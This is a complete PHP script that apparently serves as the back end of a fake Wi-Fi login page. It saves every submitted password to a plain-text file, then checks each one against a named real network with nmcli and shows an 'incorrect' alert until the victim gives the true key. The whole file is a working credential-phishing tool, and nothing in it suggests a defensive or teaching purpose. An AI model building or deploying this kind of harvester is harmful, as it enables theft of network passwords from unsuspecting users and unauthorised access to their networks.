<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['password']) && !empty($_POST['password'])) {
        $password = $_POST['password'];

        if (strlen($password) >= 8) {
            file_put_contents("passwords.txt", $password . PHP_EOL, FILE_APPEND);

            $ssid = "EasyBox-289430";

            $escaped_password = escapeshellarg($password);

            $command = "nmcli dev wifi connect $ssid password $escaped_password";
            $output = shell_exec($command);

            if ($output !== null && strpos($output, 'successfully activated') === false) {
                echo "<script type='text/javascript'>
                        alert('Password is incorrect!.');
                        window.history.back();
                      </script>";
            }

        } else {
            echo "<script type='text/javascript'>
                    alert('Password must be at least 8 characters long.');
                    window.history.back();
                  </script>";
        }
    } else {
        echo "<script type='text/javascript'>
                alert('Password field is required.');
                window.history.back();
              </script>";
    }
}
?>